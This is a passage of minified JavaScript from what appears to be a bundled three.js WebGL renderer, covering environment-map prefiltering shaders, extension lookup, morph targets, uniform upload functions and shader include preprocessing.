a=Math.pow(2,r);e.push(a);let l=1/a;o>i-Xn?l=va[o-i+Xn-1]:o===0&&(l=0),n.push(l);const c=1/(a-2),u=-c,h=1+c,p=[u,u,h,u,h,h,u,u,h,h,u,h],m=6,E=6,x=3,f=2,d=1,g=new Float32Array(x*E*m),_=new Float32Array(f*E*m),v=new Float32Array(d*E*m);for(let S=0;S<m;S++){const T=S%3*2/3-1,D=S>2?0:-1,y=[T,D,0,T+2/3,D,0,T+2/3,D+1,0,T,D,0,T+2/3,D+1,0,T,D+1,0];g.set(y,x*E*S),_.set(p,f*E*S);const R=[S,S,S,S,S,S];v.set(R,d*E*S)}const w=new Ie;w.setAttribute("position",new Be(g,x)),w.setAttribute("uv",new Be(_,f)),w.setAttribute("faceIndex",new Be(v,d)),t.push(w),r>Xn&&r--}return{lodPlanes:t,sizeLods:e,sigmas:n}}function Ma(i,t,e){const n=new Tn(i,t,e);return n.texture.mapping=er,n.texture.name="PMREM.cubeUv",n.scissorTest=!0,n}function Hi(i,t,e,n,r){i.viewport.set(t,e,n,r),i.scissor.set(t,e,n,r)}function ep(i,t,e){const n=new Float32Array(xn),r=new L(0,1,0);return new An({name:"SphericalGaussianBlur",defines:{n:xn,CUBEUV_TEXEL_WIDTH:1/t,CUBEUV_TEXEL_HEIGHT:1/e,CUBEUV_MAX_MIP:`${i}.0`},uniforms:{envMap:{value:null},samples:{value:1},weights:{value:n},latitudinal:{value:!1},dTheta:{value:0},mipInt:{value:0},poleAxis:{value:r}},vertexShader:us(),fragmentShader:`

			precision mediump float;
			precision mediump int;

			varying vec3 vOutputDirection;

			uniform sampler2D envMap;
			uniform int samples;
			uniform float weights[ n ];
			uniform bool latitudinal;
			uniform float dTheta;
			uniform float mipInt;
			uniform vec3 poleAxis;

			#define ENVMAP_TYPE_CUBE_UV
			#include <cube_uv_reflection_fragment>

			vec3 getSample( float theta, vec3 axis ) {

				float cosTheta = cos( theta );
				// Rodrigues' axis-angle rotation
				vec3 sampleDirection = vOutputDirection * cosTheta
					+ cross( axis, vOutputDirection ) * sin( theta )
					+ axis * dot( axis, vOutputDirection ) * ( 1.0 - cosTheta );

				return bilinearCubeUV( envMap, sampleDirection, mipInt );

			}

			void main() {

				vec3 axis = latitudinal ? poleAxis : cross( poleAxis, vOutputDirection );

				if ( all( equal( axis, vec3( 0.0 ) ) ) ) {

					axis = vec3( vOutputDirection.z, 0.0, - vOutputDirection.x );

				}

				axis = normalize( axis );

				gl_FragColor = vec4( 0.0, 0.0, 0.0, 1.0 );
				gl_FragColor.rgb += weights[ 0 ] * getSample( 0.0, axis );

				for ( int i = 1; i < n; i++ ) {

					if ( i >= samples ) {

						break;

					}

					float theta = dTheta * float( i );
					gl_FragColor.rgb += weights[ i ] * getSample( -1.0 * theta, axis );
					gl_FragColor.rgb += weights[ i ] * getSample( theta, axis );

				}

			}
		`,blending:an,depthTest:!1,depthWrite:!1})}function Sa(){return new An({name:"EquirectangularToCubeUV",uniforms:{envMap:{value:null}},vertexShader:us(),fragmentShader:`

			precision mediump float;
			precision mediump int;

			varying vec3 vOutputDirection;

			uniform sampler2D envMap;

			#include <common>

			void main() {

				vec3 outputDirection = normalize( vOutputDirection );
				vec2 uv = equirectUv( outputDirection );

				gl_FragColor = vec4( texture2D ( envMap, uv ).rgb, 1.0 );

			}
		`,blending:an,depthTest:!1,depthWrite:!1})}function ba(){return new An({name:"CubemapToCubeUV",uniforms:{envMap:{value:null},flipEnvMap:{value:-1}},vertexShader:us(),fragmentShader:`

			precision mediump float;
			precision mediump int;

			uniform float flipEnvMap;

			varying vec3 vOutputDirection;

			uniform samplerCube envMap;

			void main() {

				gl_FragColor = textureCube( envMap, vec3( flipEnvMap * vOutputDirection.x, vOutputDirection.yz ) );

			}
		`,blending:an,depthTest:!1,depthWrite:!1})}function us(){return`

		precision mediump float;
		precision mediump int;

		attribute float faceIndex;

		varying vec3 vOutputDirection;

		// RH coordinate system; PMREM face-indexing convention
		vec3 getDirection( vec2 uv, float face ) {

			uv = 2.0 * uv - 1.0;

			vec3 direction = vec3( uv, 1.0 );

			if ( face == 0.0 ) {

				direction = direction.zyx; // ( 1, v, u ) pos x

			} else if ( face == 1.0 ) {

				direction = direction.xzy;
				direction.xz *= -1.0; // ( -u, 1, -v ) pos y

			} else if ( face == 2.0 ) {

				direction.x *= -1.0; // ( -u, v, 1 ) pos z

			} else if ( face == 3.0 ) {

				direction = direction.zyx;
				direction.xz *= -1.0; // ( -1, v, -u ) neg x

			} else if ( face == 4.0 ) {

				direction = direction.xzy;
				direction.xy *= -1.0; // ( -u, -1, v ) neg y

			} else if ( face == 5.0 ) {

				direction.z *= -1.0; // ( u, v, -1 ) neg z

			}

			return direction;

		}

		void main() {

			vOutputDirection = getDirection( uv, faceIndex );
			gl_Position = vec4( position, 1.0 );

		}
	`}function np(i){let t=new WeakMap,e=null;function n(a){if(a&&a.isTexture){const l=a.mapping,c=l===$r||l===Kr,u=l===$n||l===Kn;if(c||u)if(a.isRenderTargetTexture&&a.needsPMREMUpdate===!0){a.needsPMREMUpdate=!1;let h=t.get(a);return e===null&&(e=new ya(i)),h=c?e.fromEquirectangular(a,h):e.fromCubemap(a,h),t.set(a,h),h.texture}else{if(t.has(a))return t.get(a).texture;{const h=a.image;if(c&&h&&h.height>0||u&&h&&r(h)){e===null&&(e=new ya(i));const p=c?e.fromEquirectangular(a):e.fromCubemap(a);return t.set(a,p),a.addEventListener("dispose",s),p.texture}else return null}}}return a}function r(a){let l=0;const c=6;for(let u=0;u<c;u++)a[u]!==void 0&&l++;return l===c}function s(a){const l=a.target;l.removeEventListener("dispose",s);const c=t.get(l);c!==void 0&&(t.delete(l),c.dispose())}function o(){t=new WeakMap,e!==null&&(e.dispose(),e=null)}return{get:n,dispose:o}}function ip(i){const t={};function e(n){if(t[n]!==void 0)return t[n];let r;switch(n){case"WEBGL_depth_texture":r=i.getExtension("WEBGL_depth_texture")||i.getExtension("MOZ_WEBGL_depth_texture")||i.getExtension("WEBKIT_WEBGL_depth_texture");break;case"EXT_texture_filter_anisotropic":r=i.getExtension("EXT_texture_filter_anisotropic")||i.getExtension("MOZ_EXT_texture_filter_anisotropic")||i.getExtension("WEBKIT_EXT_texture_filter_anisotropic");break;case"WEBGL_compressed_texture_s3tc":r=i.getExtension("WEBGL_compressed_texture_s3tc")||i.getExtension("MOZ_WEBGL_compressed_texture_s3tc")||i.getExtension("WEBKIT_WEBGL_compressed_texture_s3tc");break;case"WEBGL_compressed_texture_pvrtc":r=i.getExtension("WEBGL_compressed_texture_pvrtc")||i.getExtension("WEBKIT_WEBGL_compressed_texture_pvrtc");break;default:r=i.getExtension(n)}return t[n]=r,r}return{has:function(n){return e(n)!==null},init:function(n){n.isWebGL2?(e("EXT_color_buffer_float"),e("WEBGL_clip_cull_distance")):(e("WEBGL_depth_texture"),e("OES_texture_float"),e("OES_texture_half_float"),e("OES_texture_half_float_linear"),e("OES_standard_derivatives"),e("OES_element_index_uint"),e("OES_vertex_array_object"),e("ANGLE_instanced_arrays")),e("OES_texture_float_linear"),e("EXT_color_buffer_half_float"),e("WEBGL_multisampled_render_to_texture")},get:function(n){const r=e(n);return r===null&&console.warn("THREE.WebGLRenderer: "+n+" extension not supported."),r}}}function rp(i,t,e,n){const r={},s=new WeakMap;function o(h){const p=h.target;p.index!==null&&t.remove(p.index);for(const E in p.attributes)t.remove(p.attributes[E]);for(const E in p.morphAttributes){const x=p.morphAttributes[E];for(let f=0,d=x.length;f<d;f++)t.remove(x[f])}p.removeEventListener("dispose",o),delete r[p.id];const m=s.get(p);m&&(t.remove(m),s.delete(p)),n.releaseStatesOfGeometry(p),p.isInstancedBufferGeometry===!0&&delete p._maxInstanceCount,e.memory.geometries--}function a(h,p){return r[p.id]===!0||(p.addEventListener("dispose",o),r[p.id]=!0,e.memory.geometries++),p}function l(h){const p=h.attributes;for(const E in p)t.update(p[E],i.ARRAY_BUFFER);const m=h.morphAttributes;for(const E in m){const x=m[E];for(let f=0,d=x.length;f<d;f++)t.update(x[f],i.ARRAY_BUFFER)}}function c(h){const p=[],m=h.index,E=h.attributes.position;let x=0;if(m!==null){const g=m.array;x=m.version;for(let _=0,v=g.length;_<v;_+=3){const w=g[_+0],S=g[_+1],T=g[_+2];p.push(w,S,S,T,T,w)}}else if(E!==void 0){const g=E.array;x=E.version;for(let _=0,v=g.length/3-1;_<v;_+=3){const w=_+0,S=_+1,T=_+2;p.push(w,S,S,T,T,w)}}else return;const f=new(fo(p)?xo:vo)(p,1);f.version=x;const d=s.get(h);d&&t.remove(d),s.set(h,f)}function u(h){const p=s.get(h);if(p){const m=h.index;m!==null&&p.version<m.version&&c(h)}else c(h);return s.get(h)}return{get:a,update:l,getWireframeAttribute:u}}function sp(i,t,e,n){const r=n.isWebGL2;let s;function o(m){s=m}let a,l;function c(m){a=m.type,l=m.bytesPerElement}function u(m,E){i.drawElements(s,E,a,m*l),e.update(E,s,1)}function h(m,E,x){if(x===0)return;let f,d;if(r)f=i,d="drawElementsInstanced";else if(f=t.get("ANGLE_instanced_arrays"),d="drawElementsInstancedANGLE",f===null){console.error("THREE.WebGLIndexedBufferRenderer: using THREE.InstancedBufferGeometry but hardware does not support extension ANGLE_instanced_arrays.");return}f[d](s,E,a,m*l,x),e.update(E,s,x)}function p(m,E,x){if(x===0)return;const f=t.get("WEBGL_multi_draw");if(f===null)for(let d=0;d<x;d++)this.render(m[d]/l,E[d]);else{f.multiDrawElementsWEBGL(s,E,0,a,m,0,x);let d=0;for(let g=0;g<x;g++)d+=E[g];e.update(d,s,1)}}this.setMode=o,this.setIndex=c,this.render=u,this.renderInstances=h,this.renderMultiDraw=p}function ap(i){const t={geometries:0,textures:0},e={frame:0,calls:0,triangles:0,points:0,lines:0};function n(s,o,a){switch(e.calls++,o){case i.TRIANGLES:e.triangles+=a*(s/3);break;case i.LINES:e.lines+=a*(s/2);break;case i.LINE_STRIP:e.lines+=a*(s-1);break;case i.LINE_LOOP:e.lines+=a*s;break;case i.POINTS:e.points+=a*s;break;default:console.error("THREE.WebGLInfo: Unknown draw mode:",o);break}}function r(){e.calls=0,e.triangles=0,e.points=0,e.lines=0}return{memory:t,render:e,programs:null,autoReset:!0,reset:r,update:n}}function op(i,t){return i[0]-t[0]}function lp(i,t){return Math.abs(t[1])-Math.abs(i[1])}function cp(i,t,e){const n={},r=new Float32Array(8),s=new WeakMap,o=new ce,a=[];for(let c=0;c<8;c++)a[c]=[c,0];function l(c,u,h){const p=c.morphTargetInfluences;if(t.isWebGL2===!0){const E=u.morphAttributes.position||u.morphAttributes.normal||u.morphAttributes.color,x=E!==void 0?E.length:0;let f=s.get(u);if(f===void 0||f.count!==x){let B=function(){et.dispose(),s.delete(u),u.removeEventListener("dispose",B)};var m=B;f!==void 0&&f.texture.dispose();const _=u.morphAttributes.position!==void 0,v=u.morphAttributes.normal!==void 0,w=u.morphAttributes.color!==void 0,S=u.morphAttributes.position||[],T=u.morphAttributes.normal||[],D=u.morphAttributes.color||[];let y=0;_===!0&&(y=1),v===!0&&(y=2),w===!0&&(y=3);let R=u.attributes.position.count*y,k=1;R>t.maxTextureSize&&(k=Math.ceil(R/t.maxTextureSize),R=t.maxTextureSize);const X=new Float32Array(R*k*4*x),et=new _o(X,R,k,x);et.type=sn,et.needsUpdate=!0;const P=y*4;for(let W=0;W<x;W++){const Y=S[W],H=T[W],V=D[W],q=R*k*4*W;for(let J=0;J<Y.count;J++){const K=J*P;_===!0&&(o.fromBufferAttribute(Y,J),X[q+K+0]=o.x,X[q+K+1]=o.y,X[q+K+2]=o.z,X[q+K+3]=0),v===!0&&(o.fromBufferAttribute(H,J),X[q+K+4]=o.x,X[q+K+5]=o.y,X[q+K+6]=o.z,X[q+K+7]=0),w===!0&&(o.fromBufferAttribute(V,J),X[q+K+8]=o.x,X[q+K+9]=o.y,X[q+K+10]=o.z,X[q+K+11]=V.itemSize===4?o.w:1)}}f={count:x,texture:et,size:new zt(R,k)},s.set(u,f),u.addEventListener("dispose",B)}let d=0;for(let _=0;_<p.length;_++)d+=p[_];const g=u.morphTargetsRelative?1:1-d;h.getUniforms().setValue(i,"morphTargetBaseInfluence",g),h.getUniforms().setValue(i,"morphTargetInfluences",p),h.getUniforms().setValue(i,"morphTargetsTexture",f.texture,e),h.getUniforms().setValue(i,"morphTargetsTextureSize",f.size)}else{const E=p===void 0?0:p.length;let x=n[u.id];if(x===void 0||x.length!==E){x=[];for(let v=0;v<E;v++)x[v]=[v,0];n[u.id]=x}for(let v=0;v<E;v++){const w=x[v];w[0]=v,w[1]=p[v]}x.sort(lp);for(let v=0;v<8;v++)v<E&&x[v][1]?(a[v][0]=x[v][0],a[v][1]=x[v][1]):(a[v][0]=Number.MAX_SAFE_INTEGER,a[v][1]=0);a.sort(op);const f=u.morphAttributes.position,d=u.morphAttributes.normal;let g=0;for(let v=0;v<8;v++){const w=a[v],S=w[0],T=w[1];S!==Number.MAX_SAFE_INTEGER&&T?(f&&u.getAttribute("morphTarget"+v)!==f[S]&&u.setAttribute("morphTarget"+v,f[S]),d&&u.getAttribute("morphNormal"+v)!==d[S]&&u.setAttribute("morphNormal"+v,d[S]),r[v]=T,g+=T):(f&&u.hasAttribute("morphTarget"+v)===!0&&u.deleteAttribute("morphTarget"+v),d&&u.hasAttribute("morphNormal"+v)===!0&&u.deleteAttribute("morphNormal"+v),r[v]=0)}const _=u.morphTargetsRelative?1:1-g;h.getUniforms().setValue(i,"morphTargetBaseInfluence",_),h.getUniforms().setValue(i,"morphTargetInfluences",r)}}return{update:l}}function dp(i,t,e,n){let r=new WeakMap;function s(l){const c=n.render.frame,u=l.geometry,h=t.get(l,u);if(r.get(h)!==c&&(t.update(h),r.set(h,c)),l.isInstancedMesh&&(l.hasEventListener("dispose",a)===!1&&l.addEventListener("dispose",a),r.get(l)!==c&&(e.update(l.instanceMatrix,i.ARRAY_BUFFER),l.instanceColor!==null&&e.update(l.instanceColor,i.ARRAY_BUFFER),r.set(l,c))),l.isSkinnedMesh){const p=l.skeleton;r.get(p)!==c&&(p.update(),r.set(p,c))}return h}function o(){r=new WeakMap}function a(l){const c=l.target;c.removeEventListener("dispose",a),e.remove(c.instanceMatrix),c.instanceColor!==null&&e.remove(c.instanceColor)}return{update:s,dispose:o}}class To extends Te{constructor(t,e,n,r,s,o,a,l,c,u){if(u=u!==void 0?u:Mn,u!==Mn&&u!==Zn)throw new Error("DepthTexture format must be either THREE.DepthFormat or THREE.DepthStencilFormat");n===void 0&&u===Mn&&(n=rn),n===void 0&&u===Zn&&(n=yn),super(null,r,s,o,a,l,u,n,c),this.isDepthTexture=!0,this.image={width:t,height:e},this.magFilter=a!==void 0?a:ge,this.minFilter=l!==void 0?l:ge,this.flipY=!1,this.generateMipmaps=!1,this.compareFunction=null}copy(t){return super.copy(t),this.compareFunction=t.compareFunction,this}toJSON(t){const e=super.toJSON(t);return this.compareFunction!==null&&(e.compareFunction=this.compareFunction),e}}const Ao=new Te,Ro=new To(1,1);Ro.compareFunction=po;const wo=new _o,Co=new Yl,Po=new Mo,Ta=[],Aa=[],Ra=new Float32Array(16),wa=new Float32Array(9),Ca=new Float32Array(4);function ei(i,t,e){const n=i[0];if(n<=0||n>0)return i;const r=t*e;let s=Ta[r];if(s===void 0&&(s=new Float32Array(r),Ta[r]=s),t!==0){n.toArray(s,0);for(let o=1,a=0;o!==t;++o)a+=e,i[o].toArray(s,a)}return s}function ie(i,t){if(i.length!==t.length)return!1;for(let e=0,n=i.length;e<n;e++)if(i[e]!==t[e])return!1;return!0}function re(i,t){for(let e=0,n=t.length;e<n;e++)i[e]=t[e]}function rr(i,t){let e=Aa[t];e===void 0&&(e=new Int32Array(t),Aa[t]=e);for(let n=0;n!==t;++n)e[n]=i.allocateTextureUnit();return e}function up(i,t){const e=this.cache;e[0]!==t&&(i.uniform1f(this.addr,t),e[0]=t)}function pp(i,t){const e=this.cache;if(t.x!==void 0)(e[0]!==t.x||e[1]!==t.y)&&(i.uniform2f(this.addr,t.x,t.y),e[0]=t.x,e[1]=t.y);else{if(ie(e,t))return;i.uniform2fv(this.addr,t),re(e,t)}}function fp(i,t){const e=this.cache;if(t.x!==void 0)(e[0]!==t.x||e[1]!==t.y||e[2]!==t.z)&&(i.uniform3f(this.addr,t.x,t.y,t.z),e[0]=t.x,e[1]=t.y,e[2]=t.z);else if(t.r!==void 0)(e[0]!==t.r||e[1]!==t.g||e[2]!==t.b)&&(i.uniform3f(this.addr,t.r,t.g,t.b),e[0]=t.r,e[1]=t.g,e[2]=t.b);else{if(ie(e,t))return;i.uniform3fv(this.addr,t),re(e,t)}}function hp(i,t){const e=this.cache;if(t.x!==void 0)(e[0]!==t.x||e[1]!==t.y||e[2]!==t.z||e[3]!==t.w)&&(i.uniform4f(this.addr,t.x,t.y,t.z,t.w),e[0]=t.x,e[1]=t.y,e[2]=t.z,e[3]=t.w);else{if(ie(e,t))return;i.uniform4fv(this.addr,t),re(e,t)}}function mp(i,t){const e=this.cache,n=t.elements;if(n===void 0){if(ie(e,t))return;i.uniformMatrix2fv(this.addr,!1,t),re(e,t)}else{if(ie(e,n))return;Ca.set(n),i.uniformMatrix2fv(this.addr,!1,Ca),re(e,n)}}function _p(i,t){const e=this.cache,n=t.elements;if(n===void 0){if(ie(e,t))return;i.uniformMatrix3fv(this.addr,!1,t),re(e,t)}else{if(ie(e,n))return;wa.set(n),i.uniformMatrix3fv(this.addr,!1,wa),re(e,n)}}function gp(i,t){const e=this.cache,n=t.elements;if(n===void 0){if(ie(e,t))return;i.uniformMatrix4fv(this.addr,!1,t),re(e,t)}else{if(ie(e,n))return;Ra.set(n),i.uniformMatrix4fv(this.addr,!1,Ra),re(e,n)}}function vp(i,t){const e=this.cache;e[0]!==t&&(i.uniform1i(this.addr,t),e[0]=t)}function xp(i,t){const e=this.cache;if(t.x!==void 0)(e[0]!==t.x||e[1]!==t.y)&&(i.uniform2i(this.addr,t.x,t.y),e[0]=t.x,e[1]=t.y);else{if(ie(e,t))return;i.uniform2iv(this.addr,t),re(e,t)}}function Ep(i,t){const e=this.cache;if(t.x!==void 0)(e[0]!==t.x||e[1]!==t.y||e[2]!==t.z)&&(i.uniform3i(this.addr,t.x,t.y,t.z),e[0]=t.x,e[1]=t.y,e[2]=t.z);else{if(ie(e,t))return;i.uniform3iv(this.addr,t),re(e,t)}}function yp(i,t){const e=this.cache;if(t.x!==void 0)(e[0]!==t.x||e[1]!==t.y||e[2]!==t.z||e[3]!==t.w)&&(i.uniform4i(this.addr,t.x,t.y,t.z,t.w),e[0]=t.x,e[1]=t.y,e[2]=t.z,e[3]=t.w);else{if(ie(e,t))return;i.uniform4iv(this.addr,t),re(e,t)}}function Mp(i,t){const e=this.cache;e[0]!==t&&(i.uniform1ui(this.addr,t),e[0]=t)}function Sp(i,t){const e=this.cache;if(t.x!==void 0)(e[0]!==t.x||e[1]!==t.y)&&(i.uniform2ui(this.addr,t.x,t.y),e[0]=t.x,e[1]=t.y);else{if(ie(e,t))return;i.uniform2uiv(this.addr,t),re(e,t)}}function bp(i,t){const e=this.cache;if(t.x!==void 0)(e[0]!==t.x||e[1]!==t.y||e[2]!==t.z)&&(i.uniform3ui(this.addr,t.x,t.y,t.z),e[0]=t.x,e[1]=t.y,e[2]=t.z);else{if(ie(e,t))return;i.uniform3uiv(this.addr,t),re(e,t)}}function Tp(i,t){const e=this.cache;if(t.x!==void 0)(e[0]!==t.x||e[1]!==t.y||e[2]!==t.z||e[3]!==t.w)&&(i.uniform4ui(this.addr,t.x,t.y,t.z,t.w),e[0]=t.x,e[1]=t.y,e[2]=t.z,e[3]=t.w);else{if(ie(e,t))return;i.uniform4uiv(this.addr,t),re(e,t)}}function Ap(i,t,e){const n=this.cache,r=e.allocateTextureUnit();n[0]!==r&&(i.uniform1i(this.addr,r),n[0]=r);const s=this.type===i.SAMPLER_2D_SHADOW?Ro:Ao;e.setTexture2D(t||s,r)}function Rp(i,t,e){const n=this.cache,r=e.allocateTextureUnit();n[0]!==r&&(i.uniform1i(this.addr,r),n[0]=r),e.setTexture3D(t||Co,r)}function wp(i,t,e){const n=this.cache,r=e.allocateTextureUnit();n[0]!==r&&(i.uniform1i(this.addr,r),n[0]=r),e.setTextureCube(t||Po,r)}function Cp(i,t,e){const n=this.cache,r=e.allocateTextureUnit();n[0]!==r&&(i.uniform1i(this.addr,r),n[0]=r),e.setTexture2DArray(t||wo,r)}function Pp(i){switch(i){case 5126:return up;case 35664:return pp;case 35665:return fp;case 35666:return hp;case 35674:return mp;case 35675:return _p;case 35676:return gp;case 5124:case 35670:return vp;case 35667:case 35671:return xp;case 35668:case 35672:return Ep;case 35669:case 35673:return yp;case 5125:return Mp;case 36294:return Sp;case 36295:return bp;case 36296:return Tp;case 35678:case 36198:case 36298:case 36306:case 35682:return Ap;case 35679:case 36299:case 36307:return Rp;case 35680:case 36300:case 36308:case 36293:return wp;case 36289:case 36303:case 36311:case 36292:return Cp}}function Ip(i,t){i.uniform1fv(this.addr,t)}function Lp(i,t){const e=ei(t,this.size,2);i.uniform2fv(this.addr,e)}function Dp(i,t){const e=ei(t,this.size,3);i.uniform3fv(this.addr,e)}function Np(i,t){const e=ei(t,this.size,4);i.uniform4fv(this.addr,e)}function Up(i,t){const e=ei(t,this.size,4);i.uniformMatrix2fv(this.addr,!1,e)}function Op(i,t){const e=ei(t,this.size,9);i.uniformMatrix3fv(this.addr,!1,e)}function Fp(i,t){const e=ei(t,this.size,16);i.uniformMatrix4fv(this.addr,!1,e)}function kp(i,t){i.uniform1iv(this.addr,t)}function Bp(i,t){i.uniform2iv(this.addr,t)}function zp(i,t){i.uniform3iv(this.addr,t)}function Gp(i,t){i.uniform4iv(this.addr,t)}function Hp(i,t){i.uniform1uiv(this.addr,t)}function Vp(i,t){i.uniform2uiv(this.addr,t)}function Wp(i,t){i.uniform3uiv(this.addr,t)}function Xp(i,t){i.uniform4uiv(this.addr,t)}function qp(i,t,e){const n=this.cache,r=t.length,s=rr(e,r);ie(n,s)||(i.uniform1iv(this.addr,s),re(n,s));for(let o=0;o!==r;++o)e.setTexture2D(t[o]||Ao,s[o])}function Yp(i,t,e){const n=this.cache,r=t.length,s=rr(e,r);ie(n,s)||(i.uniform1iv(this.addr,s),re(n,s));for(let o=0;o!==r;++o)e.setTexture3D(t[o]||Co,s[o])}function jp(i,t,e){const n=this.cache,r=t.length,s=rr(e,r);ie(n,s)||(i.uniform1iv(this.addr,s),re(n,s));for(let o=0;o!==r;++o)e.setTextureCube(t[o]||Po,s[o])}function $p(i,t,e){const n=this.cache,r=t.length,s=rr(e,r);ie(n,s)||(i.uniform1iv(this.addr,s),re(n,s));for(let o=0;o!==r;++o)e.setTexture2DArray(t[o]||wo,s[o])}function Kp(i){switch(i){case 5126:return Ip;case 35664:return Lp;case 35665:return Dp;case 35666:return Np;case 35674:return Up;case 35675:return Op;case 35676:return Fp;case 5124:case 35670:return kp;case 35667:case 35671:return Bp;case 35668:case 35672:return zp;case 35669:case 35673:return Gp;case 5125:return Hp;case 36294:return Vp;case 36295:return Wp;case 36296:return Xp;case 35678:case 36198:case 36298:case 36306:case 35682:return qp;case 35679:case 36299:case 36307:return Yp;case 35680:case 36300:case 36308:case 36293:return jp;case 36289:case 36303:case 36311:case 36292:return $p}}class Zp{constructor(t,e,n){this.id=t,this.addr=n,this.cache=[],this.type=e.type,this.setValue=Pp(e.type)}}class Jp{constructor(t,e,n){this.id=t,this.addr=n,this.cache=[],this.type=e.type,this.size=e.size,this.setValue=Kp(e.type)}}class Qp{constructor(t){this.id=t,this.seq=[],this.map={}}setValue(t,e,n){const r=this.seq;for(let s=0,o=r.length;s!==o;++s){const a=r[s];a.setValue(t,e[a.id],n)}}}const Br=/(\w+)(\])?(\[|\.)?/g;function Pa(i,t){i.seq.push(t),i.map[t.id]=t}function tf(i,t,e){const n=i.name,r=n.length;for(Br.lastIndex=0;;){const s=Br.exec(n),o=Br.lastIndex;let a=s[1];const l=s[2]==="]",c=s[3];if(l&&(a=a|0),c===void 0||c==="["&&o+2===r){Pa(e,c===void 0?new Zp(a,i,t):new Jp(a,i,t));break}else{let h=e.map[a];h===void 0&&(h=new Qp(a),Pa(e,h)),e=h}}}class qi{constructor(t,e){this.seq=[],this.map={};const n=t.getProgramParameter(e,t.ACTIVE_UNIFORMS);for(let r=0;r<n;++r){const s=t.getActiveUniform(e,r),o=t.getUniformLocation(e,s.name);tf(s,o,this)}}setValue(t,e,n,r){const s=this.map[e];s!==void 0&&s.setValue(t,n,r)}setOptional(t,e,n){const r=e[n];r!==void 0&&this.setValue(t,n,r)}static upload(t,e,n,r){for(let s=0,o=e.length;s!==o;++s){const a=e[s],l=n[a.id];l.needsUpdate!==!1&&a.setValue(t,l.value,r)}}static seqWithValue(t,e){const n=[];for(let r=0,s=t.length;r!==s;++r){const o=t[r];o.id in e&&n.push(o)}return n}}function Ia(i,t,e){const n=i.createShader(t);return i.shaderSource(n,e),i.compileShader(n),n}const ef=37297;let nf=0;function rf(i,t){const e=i.split(`
`),n=[],r=Math.max(t-6,0),s=Math.min(t+6,e.length);for(let o=r;o<s;o++){const a=o+1;n.push(`${a===t?">":" "} ${a}: ${e[o]}`)}return n.join(`
`)}function sf(i){const t=Wt.getPrimaries(Wt.workingColorSpace),e=Wt.getPrimaries(i);let n;switch(t===e?n="":t===Ki&&e===$i?n="LinearDisplayP3ToLinearSRGB":t===$i&&e===Ki&&(n="LinearSRGBToLinearDisplayP3"),i){case Ze:case nr:return[n,"LinearTransferOETF"];case le:case os:return[n,"sRGBTransferOETF"];default:return console.warn("THREE.WebGLProgram: Unsupported color space:",i),[n,"LinearTransferOETF"]}}function La(i,t,e){const n=i.getShaderParameter(t,i.COMPILE_STATUS),r=i.getShaderInfoLog(t).trim();if(n&&r==="")return"";const s=/ERROR: 0:(\d+)/.exec(r);if(s){const o=parseInt(s[1]);return e.toUpperCase()+`

`+r+`

`+rf(i.getShaderSource(t),o)}else return r}function af(i,t){const e=sf(t);return`vec4 ${i}( vec4 value ) { return ${e[0]}( ${e[1]}( value ) ); }`}function of(i,t){let e;switch(t){case ml:e="Linear";break;case _l:e="Reinhard";break;case gl:e="OptimizedCineon";break;case vl:e="ACESFilmic";break;case El:e="AgX";break;case xl:e="Custom";break;default:console.warn("THREE.WebGLProgram: Unsupported toneMapping:",t),e="Linear"}return"vec3 "+i+"( vec3 color ) { return "+e+"ToneMapping( color ); }"}function lf(i){return[i.extensionDerivatives||i.envMapCubeUVHeight||i.bumpMap||i.normalMapTangentSpace||i.clearcoatNormalMap||i.flatShading||i.shaderID==="physical"?"#extension GL_OES_standard_derivatives : enable":"",(i.extensionFragDepth||i.logarithmicDepthBuffer)&&i.rendererExtensionFragDepth?"#extension GL_EXT_frag_depth : enable":"",i.extensionDrawBuffers&&i.rendererExtensionDrawBuffers?"#extension GL_EXT_draw_buffers : require":"",(i.extensionShaderTextureLOD||i.envMap||i.transmission)&&i.rendererExtensionShaderTextureLod?"#extension GL_EXT_shader_texture_lod : enable":""].filter(qn).join(`
`)}function cf(i){return[i.extensionClipCullDistance?"#extension GL_ANGLE_clip_cull_distance : require":""].filter(qn).join(`
`)}function df(i){const t=[];for(const e in i){const n=i[e];n!==!1&&t.push("#define "+e+" "+n)}return t.join(`
`)}function uf(i,t){const e={},n=i.getProgramParameter(t,i.ACTIVE_ATTRIBUTES);for(let r=0;r<n;r++){const s=i.getActiveAttrib(t,r),o=s.name;let a=1;s.type===i.FLOAT_MAT2&&(a=2),s.type===i.FLOAT_MAT3&&(a=3),s.type===i.FLOAT_MAT4&&(a=4),e[o]={type:s.type,location:i.getAttribLocation(t,o),locationSize:a}}return e}function qn(i){return i!==""}function Da(i,t){const e=t.numSpotLightShadows+t.numSpotLightMaps-t.numSpotLightShadowsWithMaps;return i.replace(/NUM_DIR_LIGHTS/g,t.numDirLights).replace(/NUM_SPOT_LIGHTS/g,t.numSpotLights).replace(/NUM_SPOT_LIGHT_MAPS/g,t.numSpotLightMaps).replace(/NUM_SPOT_LIGHT_COORDS/g,e).replace(/NUM_RECT_AREA_LIGHTS/g,t.numRectAreaLights).replace(/NUM_POINT_LIGHTS/g,t.numPointLights).replace(/NUM_HEMI_LIGHTS/g,t.numHemiLights).replace(/NUM_DIR_LIGHT_SHADOWS/g,t.numDirLightShadows).replace(/NUM_SPOT_LIGHT_SHADOWS_WITH_MAPS/g,t.numSpotLightShadowsWithMaps).replace(/NUM_SPOT_LIGHT_SHADOWS/g,t.numSpotLightShadows).replace(/NUM_POINT_LIGHT_SHADOWS/g,t.numPointLightShadows)}function Na(i,t){return i.replace(/NUM_CLIPPING_PLANES/g,t.numClippingPlanes).replace(/UNION_CLIPPING_PLANES/g,t.numClippingPlanes-t.numClipIntersection)}const pf=/^[ \t]*#include +<([\w\d./]+)>/gm;function ns(i){return i.replace(pf,hf)}const ff=new Map([["encodings_fragment","colorspace_fragment"],["encodings_pars_fragment","colorspace_pars_fragment"],["output_fragment","opaque_fragment"]]);function hf(i,t){let e=It[t];if(e===void 0){const n=ff.get(t);if(n!==void 0)e=It[n],console.warn('THREE.WebGLRenderer: Shader chunk "%s" has been deprecated. Use "%s" instead.',t,n);else throw new Error("Can not resolve #include <"+t+">")}return ns(e)}const mf=/#pragma unroll_loop_start\s+for\s*\(\s*int\s+i\s*=\s*(\d+)\s*;\s*i\s*<\s*(\d+)\s*;\s*i\s*\+\+\s*\)\s*{([\s\S]+?)}\s+#pragma unroll_loop_end/g;function Ua(i){return i.replace(mf,_f)}function _f(i,t,e,n){let r="";for(let s=parseInt(t);s<parseInt(e);s++)r+=n.replace(/\[\s*i\s*\]/g,"[ "+s+" 